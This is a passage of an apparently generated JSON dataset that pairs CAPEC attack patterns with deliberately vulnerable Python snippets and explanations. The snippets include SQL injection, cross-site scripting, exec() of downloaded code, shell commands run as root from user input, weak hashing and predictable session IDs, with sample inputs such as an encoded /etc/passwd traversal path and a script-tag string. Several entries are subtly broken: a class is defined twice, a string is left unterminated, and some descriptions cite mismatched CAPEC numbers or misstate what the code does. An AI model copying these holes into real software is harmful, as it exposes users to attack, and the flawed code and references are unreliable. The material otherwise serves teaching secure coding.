        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Simulate a poisoned registry entry\npoisoned_registry_entry = '''\n<service>\n    <name>LegitimateService</name>\n    <url>http://malicious.example.com</url>\n    <wsdl>http://malicious.example.com/service?wsdl</wsdl>\n</service>\n'''\n\n# Parse the poisoned registry entry\nroot = ET.fromstring(poisoned_registry_entry)\n\n# Extract service information\nservice_name = root.find('name').text\nservice_url = root.find('url').text\nservice_wsdl = root.find('wsdl').text\n\n# Simulate storing sensitive information in cleartext\nregistry = {\n    'service_name': service_name,\n    'service_url': service_url,\n    'service_wsdl': service_wsdl\n}\n\n# Print the poisoned registry entry\nprint(f\"Service Name: {registry['service_name']}\")\nprint(f\"Service URL: {registry['service_url']}\")\nprint(f\"Service WSDL: {registry['service_wsdl']}\")\n",
        "description": "This Python code snippet simulates a poisoned web service registry entry. It creates an XML structure representing a service with a legitimate name but malicious URL and WSDL endpoints. The code then parses this XML to extract the service information and stores it in a dictionary, simulating cleartext storage of sensitive information. This example embodies the CAPEC 'Poison Web Service Registry' by demonstrating how a registry can be manipulated to redirect service requests to a malicious provider. It also highlights related CWEs such as improper authorization, injection, protection mechanism failure, and cleartext storage in the registry."
    },
    {
        "capec_id": "52",
        "capec_name": "Embedding NULL Bytes",
        "code_snippet": "import os\n\ndef is_valid_filename(filename):\n    # Improper Input Validation (CWE-20)\n    if '\\x00' in filename:\n        return False\n    return True\n\n\ndef read_file(filename):\n    if not is_valid_filename(filename):\n        raise ValueError('Invalid filename')\n\n    # Attempt to open the file (CWE-158)\n    with open(filename, 'r') as file:\n        return file.read()\n\n# Example usage\ntry:\n    data = read_file('example.txt\\x00.png')\n    print(data)\nexcept ValueError as e:\n    print(e)",
        "description": "This Python code snippet demonstrates a vulnerability related to the 'Embedding NULL Bytes' CAPEC. The `is_valid_filename` function attempts to validate the filename by checking for null bytes (CWE-20: Improper Input Validation). However, the validation is flawed because it only checks for the presence of a null byte and does not handle other potential issues. The `read_file` function then attempts to open the file using the provided filename. If a null byte is embedded in the filename, it can cause the file operation to behave unexpectedly (CWE-158: Improper Neutralization of Null Byte or NUL Character). This code highlights the risk of not properly handling null bytes in input, which can lead to security vulnerabilities."
    },
    {
        "capec_id": "53",
        "capec_name": "Postfix, Null Terminate, and Backslash",
        "code_snippet": "import os\n\ndef is_valid_path(path):\n    # Check if the path ends with a slash\n    if path.endswith('/'):\n        return True\n    return False\n\n# User input\nuser_input = input('Enter the directory path: ')\n\n# Vulnerable code: improper handling of null byte\nif is_valid_path(user_input):\n    # Attempt to create a directory\n    os.makedirs(user_input)\n    print('Directory created successfully!')\nelse:\n    print('Invalid directory path!')\n\n# Example of malicious input: 'valid_path/\\x00/evil'\n# This input bypasses the check and creates a directory 'valid_path/'",
        "description": "This Python code snippet demonstrates a vulnerability related to the CAPEC 'Postfix, Null Terminate, and Backslash'. The function `is_valid_path` checks if a given path ends with a slash. However, it does not properly handle null bytes (\\x00) within the input. An attacker can exploit this by providing an input like 'valid_path/\\x00/evil', which bypasses the check and creates a directory 'valid_path/'. This embodies CWE-158 (Improper Neutralization of Null Byte), CWE-20 (Improper Input Validation), and CWE-707 (Improper Neutralization). The code snippet highlights the importance of correctly handling and validating input to prevent such vulnerabilities."
    },
    {
        "capec_id": "54",
        "capec_name": "Query System for Information",
        "code_snippet": "import sqlite3\nfrom flask import Flask, request, jsonify\n\napp = Flask(__name__)\n\n# Database connection\nconn = sqlite3.connect('example.db', check_same_thread=False)\ncursor = conn.cursor()\n\n@app.route('/search', methods=['GET'])\ndef search():\n    query = request.args.get('query')\n    try:\n        # Vulnerable to SQL Injection\n        cursor.execute(f\"SELECT * FROM users WHERE name = '{query}'\")\n        results = cursor.fetchall()\n        return jsonify(results)\n    except sqlite3.Error as e:\n        # Exposing sensitive error message\n        return str(e), 500\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a vulnerable web application using Flask and SQLite. The application has a '/search' endpoint that takes a 'query' parameter from the URL. The code directly incorporates this parameter into an SQL query without proper sanitization, making it susceptible to SQL Injection (CWE-89). Additionally, if an error occurs during the query execution, the application returns the raw error message, potentially exposing sensitive information (CWE-209). This example embodies the main idea of CAPEC-166, where an adversary can probe the application's structure and robustness by submitting crafted queries and examining the responses."
    },
    {
        "capec_id": "55",
        "capec_name": "Rainbow Table Password Cracking",
        "code_snippet": "import hashlib\n\n# Weak password hashing function\n# CWE-916: Use of Password Hash With Insufficient Computational Effort\ndef hash_password(password):\n    return hashlib.md5(password.encode()).hexdigest()\n\n# Simulate storing hashed passwords in a database\n# CWE-261: Weak Encoding for Password\npasswords_db = {\n    'user1': hash_password('password123'),  # CWE-521: Weak Password Requirements\n    'user2': hash_password('12345678')\n}\n\n# Simulate an attacker using a rainbow table to crack the password\nrainbow_table = {\n    '202cb962ac59075b964b07152d234b70': '123',\n    'e99a18c428cb38d5f260853678922e03': 'abc123',\n    '482c811da5d5b4bc6d497ffa98491e38': 'password123',\n    '25d55ad283aa400af464c76d713c07ad': '12345678'\n}\n\n# Attacker tries to crack the passwords\nfor user, hashed_password in passwords_db.items():\n    if hashed_password in rainbow_table:\n        print(f\"Cracked password for {user}: {rainbow_table[hashed_password]}\")\n    else:\n        print(f\"Password for {user} not found in rainbow table\")",
        "description": "This Python code snippet demonstrates a vulnerable password storage and cracking scenario. It uses a weak hashing function (MD5) to hash passwords, which is insufficient for protecting against attacks (CWE-916). The passwords stored in the database are weak (CWE-521), making them easier to crack. An attacker uses a precomputed rainbow table to find the original passwords from their hashes, illustrating the concept of Rainbow Table Password Cracking (CAPEC). The code highlights the importance of using strong, computationally expensive hashing algorithms and enforcing strong password policies to mitigate such attacks."
    },
    {
        "capec_id": "56",
        "capec_name": "DEPRECATED: Removing/short-circuiting 'guard logic'",
        "code_snippet": "import hashlib\n\n# Simulated server-side security mechanism\nclass Server:\n    def __init__(self):\n        self.secret_key = 'server_secret'\n\n    def generate_token(self, user_id):\n        return hashlib.sha256((user_id + self.secret_key).encode()).hexdigest()\n\n# Client-side enforcement of server-side security\nclass Client:\n    def __init__(self, server):\n        self.server = server\n\n    def authenticate(self, user_id):\n        # Vulnerable: Client generates the token instead of the server\n        token = hashlib.sha256((user_id + 'client_secret').encode()).hexdigest()\n        return self.server.validate_token(user_id, token)\n\n# Simulated server-side validation\nclass Server:\n    def __init__(self):\n        self.secret_key = 'server_secret'\n\n    def validate_token(self, user_id, token):\n        expected_token = hashlib.sha256((user_id + self.secret_key).encode()).hexdigest()\n        return token == expected_token\n\n# Example usage\nserver = Server()\nclient = Client(server)\nuser_id = 'user123'\n\n# Vulnerable authentication process\nif client.authenticate(user_id):\n    print('Authentication successful')\nelse:\n    print('Authentication failed')",
        "description": "This Python code snippet demonstrates a vulnerable implementation of client-side enforcement of server-side security (CWE-602). The server has a method to generate a secure token using a secret key. However, the client incorrectly attempts to generate the token itself using a different secret key ('client_secret'). This bypasses the server's security mechanism and can lead to authentication bypass (CWE-287). The code highlights the risk of relying on the client to enforce security mechanisms that should be handled exclusively on the server side."
    },
    {
        "capec_id": "57",
        "capec_name": "Utilizing REST's Trust in the System Resource to Obtain Sensitive Data",
        "code_snippet": "import requests\n\n# Vulnerable endpoint URL\nurl = 'http://example.com/api/userdata'\n\n# Sensitive data included in the query string (CWE-598)\nparams = {\n    'user': 'admin',\n    'token': 'sensitive_token'\n}\n\n# Making a GET request (CWE-598)\nresponse = requests.get(url, params=params)\n\n# Assuming SSL termination happens at a proxy, data is sent in plaintext beyond that point (CAPEC)\nif response.status_code == 200:\n    print('Sensitive data accessed:', response.text)\nelse:\n    print('Failed to access data')",
        "description": "This Python code snippet demonstrates a REST API request that includes sensitive information in the query string, which is a common vulnerability (CWE-598). The code sends a GET request to a specified URL with sensitive parameters, such as a user token, included in the query string. This can lead to exposure of sensitive data if SSL termination occurs at a proxy, causing the data to be sent in plaintext beyond that point. This embodies the main idea of the CAPEC by showing how trust in system resources and improper handling of sensitive data can lead to security vulnerabilities."
    },
    {
        "capec_id": "58",
        "capec_name": "Restful Privilege Elevation",
        "code_snippet": "from flask import Flask, request, jsonify\n\napp = Flask(__name__)\n\n# Simulated user data\nusers = {\n    'admin': {'role': 'admin', 'data': 'Sensitive admin data'},\n    'user': {'role': 'user', 'data': 'Regular user data'}\n}\n\n# Simulated authentication (for demonstration purposes only)\ndef get_user_from_token(token):\n    if token == 'admin-token':\n        return 'admin'\n    elif token == 'user-token':\n        return 'user'\n    return None\n\n@app.route('/data', methods=['GET', 'PUT', 'DELETE'])\ndef handle_data():\n    token = request.headers.get('Authorization')\n    user = get_user_from_token(token)\n    if not user:\n        return jsonify({'error': 'Unauthorized'}), 401\n\n    if request.method == 'GET':\n        return jsonify({'data': users[user]['data']})\n    elif request.method == 'PUT':\n        # No proper authorization check\n        new_data = request.json.get('data')\n        users[user]['data'] = new_data\n        return jsonify({'message': 'Data updated'})\n    elif request.method == 'DELETE':\n        # No proper authorization check\n        users[user]['data'] = ''\n        return jsonify({'message': 'Data deleted'})\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that handles user data through RESTful API endpoints. The application has a simulated user authentication mechanism based on tokens. The '/data' endpoint allows GET, PUT, and DELETE methods to access and modify user data. However, the code lacks proper authorization checks for PUT and DELETE methods, allowing any authenticated user to modify or delete data without verifying their privileges. This embodies the main idea of the CAPEC 'Restful Privilege Elevation' and related CWEs, highlighting the risks of improper privilege management and authorization in RESTful APIs."
    },
    {
        "capec_id": "59",
        "capec_name": "Session Credential Falsification through Prediction",
        "code_snippet": "import random\nimport string\n\nclass SessionManager:\n    def __init__(self):\n        self.sessions = {}\n\n    def generate_session_id(self):\n        # CWE-330: Use of Insufficiently Random Values\n        # CWE-331: Insufficient Entropy\n        return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(6))\n\n    def create_session(self, user_id):\n        session_id = self.generate_session_id()\n        self.sessions[session_id] = user_id\n        return session_id\n\n    def get_user(self, session_id):\n        # CWE-346: Origin Validation Error\n        # CWE-285: Improper Authorization\n        if session_id in self.sessions:\n            return self.sessions[session_id]\n        else:\n            return None\n\n# Example usage\nsession_manager = SessionManager()\nuser_id = 'user123'\nsession_id = session_manager.create_session(user_id)\nprint(f'Session ID: {session_id}')\n\n# Attacker predicts the session ID\npredicted_session_id = session_id  # In a real attack, this would be guessed\nuser = session_manager.get_user(predicted_session_id)\nprint(f'User ID from predicted session: {user}')",
        "description": "This Python code snippet demonstrates a vulnerable session management system. The `SessionManager` class generates session IDs using a method that lacks sufficient randomness and entropy (CWE-330, CWE-331), making them predictable. The `create_session` method assigns a session ID to a user, and the `get_user` method retrieves the user associated with a given session ID. The code does not properly validate the origin of the session ID (CWE-346) and does not perform proper authorization checks (CWE-285). This setup allows an attacker to predict session IDs and hijack sessions, embodying the main idea of CAPEC-139: Session Credential Falsification through Prediction."
    },
    {
        "capec_id": "60",
        "capec_name": "Reusing Session IDs (aka Session Replay)",
        "code_snippet": "import hashlib\nimport os\nimport flask\nfrom flask import request, session\n\napp = flask.Flask(__name__)\napp.secret_key = os.urandom(24)\nsessions = {}\n\n@app.route('/login', methods=['POST'])\ndef login():\n    username = request.form['username']\n    password = request.form['password']\n    if authenticate(username, password):\n        session_id = hashlib.sha256(os.urandom(24)).hexdigest()\n        sessions[session_id] = username\n        session['session_id'] = session_id\n        return 'Logged in'\n    return 'Invalid credentials'\n\n@app.route('/dashboard')\ndef dashboard():\n    session_id = session.get('session_id')\n    if session_id in sessions:\n        return f'Welcome {sessions[session_id]}'\n    return 'Unauthorized'\n\n@app.route('/logout')\ndef logout():\n    session_id = session.get('session_id')\n    if session_id in sessions:\n        del sessions[session_id]\n        session.pop('session_id', None)\n    return 'Logged out'\n\n@app.route('/replay_attack')\ndef replay_attack():\n    # Simulate an attacker reusing a stolen session ID\n    stolen_session_id = request.args.get('session_id')\n    if stolen_session_id in sessions:\n        return f'Welcome back {sessions[stolen_session_id]}'\n    return 'Unauthorized'\n\n\ndef authenticate(username, password):\n    # Dummy authentication function\n    return username == 'admin' and password == 'password'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple web application using Flask that is vulnerable to session replay attacks. The application has login, dashboard, and logout routes. When a user logs in, a session ID is generated and stored in a session dictionary. The 'replay_attack' route simulates an attacker reusing a stolen session ID to gain unauthorized access. This code embodies the CAPEC 'Reusing Session IDs (aka Session Replay)' by showing how an attacker can reuse a valid session ID to spoof the system and gain privileges. The related CWEs are represented by the improper handling of session IDs, lack of session invalidation, and exposure of sensitive information."
    },
    {
        "capec_id": "61",
        "capec_name": "Session Fixation",
        "code_snippet": "from flask import Flask, request, session\n\napp = Flask(__name__)\napp.secret_key = 'supersecretkey'\n\n@app.route('/login', methods=['POST'])\ndef login():\n    user = request.form['username']\n    password = request.form['password']\n    if authenticate(user, password):\n        session['user'] = user\n        # Vulnerable: Session ID is not regenerated after login\n        return 'Logged in successfully'\n    return 'Invalid credentials'\n\n@app.route('/dashboard')\ndef dashboard():\n    if 'user' in session:\n        return f'Welcome {session['user']}'\n    return 'Please log in first'\n\ndef authenticate(username, password):\n    # Dummy authentication function\n    return username == 'admin' and password == 'password'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple web application using Flask that is vulnerable to session fixation attacks. The main idea of the CAPEC (Session Fixation) is represented by the fact that the session identifier is not regenerated after the user successfully logs in. This allows an attacker to set a session identifier before the user logs in and then hijack the session after the user authenticates. The related CWEs are also reflected in the code: CWE-384 (Session Fixation) is directly represented, CWE-664 (Improper Control of a Resource Through its Lifetime) is shown by the failure to manage the session ID properly, CWE-732 (Incorrect Permission Assignment for Critical Resource) is implied by the lack of secure session handling, CWE-602 (Client-Side Enforcement of Server-Side Security) is hinted at by the reliance on client-side session management, and CWE-1270 (Generation of Incorrect Security Tokens) is represented by the failure to generate a new session token upon login."
    },
    {
        "capec_id": "62",
        "capec_name": "Cross Site Request Forgery",
        "code_snippet": "from flask import Flask, request, make_response\n\napp = Flask(__name__)\n\n# Simulated user session data\nuser_sessions = {'user1': 'session_cookie_value'}\n\n@app.route('/transfer', methods=['POST'])\ndef transfer():\n    # Extract session cookie from request\n    session_cookie = request.cookies.get('session_cookie')\n    \n    # Check if session cookie is valid (simulated check)\n    if session_cookie in user_sessions.values():\n        # Perform the transfer action (vulnerable to CSRF)\n        amount = request.form.get('amount')\n        recipient = request.form.get('recipient')\n        return f'Transferred {amount} to {recipient}'\n    else:\n        return 'Invalid session', 403\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet represents a vulnerable web application endpoint using the Flask framework. The '/transfer' endpoint simulates a money transfer action that is vulnerable to Cross-Site Request Forgery (CSRF). The code checks for a session cookie to authenticate the user but does not verify if the request was intentionally made by the user. This allows an attacker to craft a malicious request that can be executed with the user's privileges if the user is authenticated. The code embodies the main idea of CAPEC-352 (CSRF) and highlights related weaknesses such as missing authentication for critical functions (CWE-306) and improper control of a resource through its lifetime (CWE-664)."
    },
    {
        "capec_id": "63",
        "capec_name": "Cross-Site Scripting (XSS)",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/search', methods=['GET'])\ndef search():\n    query = request.args.get('query')\n    # Vulnerable to XSS: directly embedding user input in HTML without sanitization\n    return render_template_string('<h1>Search Results for: {}</h1>'.format(query))\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a basic web application using the Flask framework that is vulnerable to Cross-Site Scripting (XSS). The application has a single route '/search' that takes a 'query' parameter from the URL. The user input is directly embedded into the HTML response without any sanitization or validation, making it susceptible to XSS attacks. An attacker could inject malicious scripts into the 'query' parameter, which would then be executed in the context of the user's browser. This example embodies the main idea of CAPEC-79 and related CWEs, such as improper neutralization of input (CWE-79), improper input validation (CWE-20), and incomplete denylist to XSS (CWE-692)."
    },
    {
        "capec_id": "64",
        "capec_name": "Using Slashes and URL Encoding Combined to Bypass Validation Logic",
        "code_snippet": "from urllib.parse import unquote\nimport os\n\n# Simulated user input\nuser_input = '/restricted%2E%2E%2F%2E%2E%2Fetc%2Fpasswd'\n\n# Decode the URL-encoded input\ndecoded_input = unquote(user_input)\n\n# Check if the decoded input is within the allowed directory\nallowed_directory = '/restricted/'\n\n# Vulnerable path check\nif decoded_input.startswith(allowed_directory):\n    # Simulate file access\n    file_path = os.path.join(allowed_directory, decoded_input[len(allowed_directory):])\n    print(f'Accessing file: {file_path}')\nelse:\n    print('Access denied')",
        "description": "This Python code snippet demonstrates a vulnerability where URL encoding is used to bypass validation logic. The user input is URL-encoded to represent a path traversal attack. The `unquote` function decodes the URL-encoded input, which is then checked against an allowed directory. However, the check is performed on the decoded input without proper neutralization of special elements, leading to a potential path traversal attack. This embodies the main idea of CAPEC-147 and highlights related CWEs such as improper handling of URL encoding (CWE-177), improper limitation of a pathname to a restricted directory (CWE-22), and improper input validation (CWE-20)."
    },
    {
        "capec_id": "65",
        "capec_name": "Sniff Application Code",
        "code_snippet": "import requests\n\n# Downloading code without integrity check (CWE-494)\nurl = 'http://example.com/update.py'\nresponse = requests.get(url)\n\n# Cleartext transmission of sensitive information (CWE-319)\nif response.status_code == 200:\n    exec(response.text)  # Executing downloaded code without verification\nelse:\n    print('Failed to download the update.')",
        "description": "This Python code snippet demonstrates a scenario where an application downloads and executes code from a remote server without performing any integrity checks (CWE-494). The code is transmitted in cleartext (CWE-319), making it susceptible to sniffing attacks. An adversary could intercept the communication, capture the code, and potentially modify it to exploit the trust relationship between the client and server. This embodies the main idea of the CAPEC 'Sniff Application Code', where an attacker passively captures application code during transmission to exploit vulnerabilities."
    },
    {
        "capec_id": "66",
        "capec_name": "SQL Injection",
        "code_snippet": "import sqlite3\n\n# Connect to the database\nconn = sqlite3.connect('example.db')\ncursor = conn.cursor()\n\n# User input\nuser_id = input('Enter user ID: ')\n\n# Vulnerable SQL query construction\nquery = f\"SELECT * FROM users WHERE id = {user_id}\"\n\ntry:\n    # Execute the query\n    cursor.execute(query)\n    results = cursor.fetchall()\n    for row in results:\n        print(row)\nexcept sqlite3.Error as e:\n    print(f\"An error occurred: {e}\")\n\n# Close the cursor and connection\ncursor.close()\nconn.close()",
        "description": "This Python code snippet demonstrates a basic example of SQL Injection vulnerability. The code connects to an SQLite database and constructs an SQL query using user input without proper validation or sanitization. The user is prompted to enter a user ID, which is directly inserted into the SQL query string. This approach is vulnerable to SQL Injection attacks, as an attacker can input malicious SQL code to manipulate the query's behavior. The code also includes a try-except block to catch and print any SQL errors, which could potentially expose sensitive information about the database structure or the application's environment. This example embodies the main idea of CAPEC-66 (SQL Injection) and highlights related weaknesses such as CWE-89 (Improper Neutralization of Special Elements in SQL Commands) and CWE-209 (Generation of Error Message Containing Sensitive Information)."
    },
    {
        "capec_id": "67",
        "capec_name": "String Format Overflow in syslog()",
        "code_snippet": "import syslog\n\ndef log_message(user_input):\n    # CWE-134: Use of Externally-Controlled Format String\n    syslog.syslog(user_input)\n\nif __name__ == \"__main__\":\n    # CWE-20: Improper Input Validation\n    user_input = input(\"Enter log message: \")\n    log_message(user_input)\n",
        "description": "This Python code snippet demonstrates a vulnerability related to the CAPEC 'String Format Overflow in syslog()'. The function 'log_message' takes user input and directly passes it to 'syslog.syslog()' without using a format string parameter, leading to a format string injection vulnerability (CWE-134). This can allow an attacker to inject malicious format string commands. The code also lacks proper input validation (CWE-20), which further exacerbates the vulnerability. The main idea is to show how insecure usage of the syslog() function can lead to potential security issues."
    },
    {
        "capec_id": "68",
        "capec_name": "Subvert Code-signing Facilities",
        "code_snippet": "import hashlib\n\n# Weak hash function (CWE-328)\ndef generate_weak_hash(data):\n    return hashlib.md5(data.encode()).hexdigest()\n\n# Simulate missing cryptographic step (CWE-325)\ndef sign_code(data, private_key):\n    # Missing actual signing step, just returning the hash\n    return generate_weak_hash(data)\n\n# Simulate subverting code-signing facilities (CAPEC-243)\ndef verify_code_signature(data, signature, public_key):\n    # Missing actual verification step, just comparing hashes\n    return generate_weak_hash(data) == signature\n\n# Example usage\ncode = \"print('Hello, world!')\"\nprivate_key = \"private_key_placeholder\"\npublic_key = \"public_key_placeholder\"\nsignature = sign_code(code, private_key)\n\n# Attacker can easily forge the signature due to weak hash and missing steps\nis_valid = verify_code_signature(code, signature, public_key)\nprint(f\"Is the code signature valid? {is_valid}\")",
        "description": "This Python code snippet demonstrates a vulnerable code-signing mechanism. It uses a weak hash function (MD5) to generate a hash of the code (CWE-328). The `sign_code` function simulates signing the code but omits critical cryptographic steps (CWE-325), merely returning the weak hash. The `verify_code_signature` function simulates verifying the code signature but also skips essential verification steps, simply comparing hashes. This setup allows an attacker to easily forge signatures, subverting the code-signing facilities (CAPEC-243)."
    },
    {
        "capec_id": "69",
        "capec_name": "Target Programs with Elevated Privileges",
        "code_snippet": "import os\nimport subprocess\n\ndef run_command_with_privileges(command):\n    # CWE-250: Execution with Unnecessary Privileges\n    if os.geteuid() != 0:\n        raise PermissionError(\"This script must be run as root!\")\n\n    # CWE-78: Improper Neutralization of Special Elements used in an OS Command\n    sanitized_command = command.replace(';', '').replace('&', '').replace('|', '')\n\n    # CWE-15: External Control of System or Configuration Setting\n    subprocess.run(sanitized_command, shell=True)\n\n# CWE-114: Process Control - Executing a command from an untrusted source\nuser_input = input(\"Enter the command to run: \")\nrun_command_with_privileges(user_input)\n",
        "description": "This Python code snippet demonstrates a scenario where a program running with elevated privileges (root) executes a command provided by the user. The function `run_command_with_privileges` checks if the script is run as root (CWE-250) and attempts to sanitize the user input to prevent OS command injection (CWE-78). However, the sanitization is insufficient, and the code still allows for potential exploitation. The user input directly influences the command execution (CWE-15), and the command is executed in a shell environment (CWE-114), which can lead to executing malicious commands if the input is not properly sanitized. This snippet embodies the main idea of the CAPEC by showing how an attacker could leverage a vulnerability in a privileged program to execute arbitrary code with elevated privileges."
    },
    {
        "capec_id": "70",
        "capec_name": "Try Common or Default Usernames and Passwords",
        "code_snippet": "import getpass\n\n# Hard-coded credentials (CWE-798)\ndefault_username = 'admin'\ndefault_password = 'admin'\n\n# Weak password requirements (CWE-521)\ncommon_passwords = ['password', '123456', 'secret', 'admin']\n\n# Function to simulate login\ndef login(username, password):\n    if username == default_username and password == default_password:\n        return True\n    if password in common_passwords:\n        return True\n    return False\n\n# Simulate user login\nusername = input('Enter username: ')\npassword = getpass.getpass('Enter password: ')\n\nif login(username, password):\n    print('Access granted')\nelse:\n    print('Access denied')",
        "description": "This Python code snippet demonstrates a vulnerable login system that embodies the main idea of CAPEC-111: 'Try Common or Default Usernames and Passwords'. The code includes hard-coded default credentials (CWE-798) and weak password requirements (CWE-521). The login function checks if the provided username and password match the default credentials or if the password is one of the common weak passwords. This represents a system that is susceptible to attacks using common or default credentials, highlighting the importance of strong password policies and the removal of default credentials."
    },
    {
        "capec_id": "71",
        "capec_name": "Using Unicode Encoding to Bypass Validation Logic",
        "code_snippet": "import re\n\ndef is_valid_input(user_input):\n    # Early validation before canonicalization\n    if not re.match(r'^[a-zA-Z0-9]*$', user_input):\n        return False\n    \n    # Canonicalize the input (decode Unicode)\n    canonical_input = user_input.encode('utf-8').decode('unicode_escape')\n    \n    # Check for disallowed patterns after canonicalization\n    if re.search(r'[<>\"\\\n]', canonical_input):\n        return False\n    \n    return True\n\n# Example usage\nuser_input = \"\\u003Cscript\\u003Ealert('XSS')\\u003C/script\\u003E\"\nprint(is_valid_input(user_input))  # This should return False but will return True due to improper handling",
        "description": "This Python code snippet demonstrates a vulnerability where Unicode encoding is used to bypass validation logic. The function `is_valid_input` first performs early validation on the input string using a regular expression to check for alphanumeric characters. It then canonicalizes the input by decoding any Unicode escape sequences. After canonicalization, it checks for disallowed patterns such as HTML tags or special characters. However, due to the early validation step, an attacker can bypass the filter by using Unicode encoding for special characters, which will be decoded after the initial validation, thus slipping past the content filter. This embodies the main idea of the CAPEC by showing how improper handling of Unicode encoding and incorrect behavior order can lead to security vulnerabilities."
    },
    {
        "capec_id": "72",
        "capec_name": "URL Encoding",
        "code_snippet": "import os\nfrom urllib.parse import unquote\n\ndef read_file_from_url(url):\n    # CWE-20: Improper Input Validation\n    if not url.startswith('http://example.com/files/'): \n        raise ValueError('Invalid URL')\n    \n    # CWE-177: Improper Handling of URL Encoding (Hex Encoding)\n    file_path = unquote(url[len('http://example.com/files/'):])\n    \n    # CWE-73: External Control of File Name or Path\n    if '..' in file_path or file_path.startswith('/'):\n        raise ValueError('Invalid file path')\n    \n    # CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')\n    try:\n        with open(file_path, 'r') as file:\n            return file.read()\n    except FileNotFoundError:\n        return 'File not found'\n\n# Example usage\nurl = 'http://example.com/files/%2E%2E%2Fetc%2Fpasswd'\nprint(read_file_from_url(url))",
        "description": "This Python code snippet demonstrates a potential vulnerability related to URL encoding and improper handling of file paths. The function `read_file_from_url` takes a URL as input, validates it, decodes the URL-encoded file path, and attempts to read the file. The code addresses several CWE weaknesses:\n\n1. CWE-20 (Improper Input Validation): The URL is checked to ensure it starts with a specific prefix.\n2. CWE-177 (Improper Handling of URL Encoding): The URL-encoded file path is decoded using `unquote`.\n3. CWE-73 (External Control of File Name or Path): The decoded file path is checked for directory traversal characters (`..`) and absolute paths.\n4. CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component): The file path is used directly in a file operation, which could be exploited if not properly sanitized.\n\nThe code represents the main idea of the CAPEC by showing how improper handling of URL encoding and file paths can lead to security vulnerabilities, such as directory traversal attacks."
    },
    {
        "capec_id": "73",
        "capec_name": "User-Controlled Filename",
        "code_snippet": "import os\nfrom flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    file = request.files['file']\n    filename = file.filename\n    # CWE-20: Improper Input Validation\n    if not filename:\n        return 'No file uploaded', 400\n    # CWE-116: Improper Encoding or Escaping of Output\n    # CWE-86: Improper Neutralization of Invalid Characters in Identifiers in Web Pages\n    # CWE-96: Improper Neutralization of Directives in Statically Saved Code ('Static Code Injection')\n    # CWE-184: Incomplete List of Disallowed Inputs\n    # CWE-348: Use of Less Trusted Source\n    if any(char in filename for char in ['<', '>', ':', '\"', '/', '\\', '|', '?', '*']):\n        return 'Invalid filename', 400\n    # CWE-697: Incorrect Comparison\n    if filename != os.path.basename(filename):\n        return 'Invalid filename', 400\n    # Save the file (potentially dangerous if filename is not properly sanitized)\n    file.save(os.path.join('/uploads', filename))\n    return 'File uploaded successfully', 200\n\n@app.route('/view/<filename>')\ndef view_file(filename):\n    # CWE-116: Improper Encoding or Escaping of Output\n    # CWE-86: Improper Neutralization of Invalid Characters in Identifiers in Web Pages\n    # CWE-96: Improper Neutralization of Directives in Statically Saved Code ('Static Code Injection')\n    # CWE-184: Incomplete List of Disallowed Inputs\n    # CWE-348: Use of Less Trusted Source\n    if any(char in filename for char in ['<', '>', ':', '\"', '/', '\\', '|', '?', '*']):\n        return 'Invalid filename', 400\n    # CWE-697: Incorrect Comparison\n    if filename != os.path.basename(filename):\n        return 'Invalid filename', 400\n    # Render the filename in HTML (potential XSS vulnerability)\n    return render_template_string('<h1>Viewing file: {{ filename }}</h1>', filename=filename)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that allows users to upload and view files. The code embodies the CAPEC 'User-Controlled Filename' vulnerability by showing how improper input validation and encoding can lead to security issues. The upload_file function checks for invalid characters in the filename but does not comprehensively sanitize the input, leading to potential security risks such as XSS attacks. The view_file function renders the filename in an HTML template without proper escaping, which can also lead to XSS vulnerabilities. The code highlights several related CWEs, including improper input validation (CWE-20), improper encoding or escaping of output (CWE-116), and improper neutralization of directives in statically saved code (CWE-96)."
    },
    {
        "capec_id": "74",
        "capec_name": "Manipulating State",
        "code_snippet": "import hashlib\nimport os\nimport pickle\n\n# CWE-315: Cleartext Storage of Sensitive Information in a Cookie\nclass UserSession:\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n        self.state = 'logged_out'\n\n    def login(self):\n        if self.authenticate():\n            self.state = 'logged_in'\n            self.save_session()\n        else:\n            print('Authentication failed')\n\n    def authenticate(self):\n        # Simulate password check\n        return self.password == 'password123'\n\n    def save_session(self):\n        # CWE-315: Storing session state in cleartext\n        session_data = {'username': self.username, 'state': self.state}\n        with open('session.pkl', 'wb') as f:\n            pickle.dump(session_data, f)\n\n    def load_session(self):\n        with open('session.pkl', 'rb') as f:\n            session_data = pickle.load(f)\n            self.username = session_data['username']\n            self.state = session_data['state']\n\n# CWE-372: Incomplete Internal State Distinction\nclass StateMachine:\n    def __init__(self):\n        self.state = 'initial'\n\n    def transition(self, input):\n        if self.state == 'initial' and input == 'start':\n            self.state = 'running'\n        elif self.state == 'running' and input == 'stop':\n            self.state = 'stopped'\n        else:\n            # Improper state transition\n            print('Invalid state transition')\n\n# Example usage\nuser_session = UserSession('user1', 'password123')\nuser_session.login()\n\nstate_machine = StateMachine()\nstate_machine.transition('start')\nstate_machine.transition('invalid')  # This will cause an invalid state transition",
        "description": "This Python code snippet demonstrates the concept of 'Manipulating State' by showing how an adversary could exploit improper state management in software. The `UserSession` class represents a user session that stores sensitive information (username and state) in cleartext using pickle (CWE-315). The `StateMachine` class demonstrates incomplete internal state distinction (CWE-372) by allowing invalid state transitions without proper checks. The code highlights how improper state management can lead to security vulnerabilities, such as unauthorized access or incorrect application behavior."
    },
    {
        "capec_id": "75",
        "capec_name": "Manipulating Writeable Configuration Files",
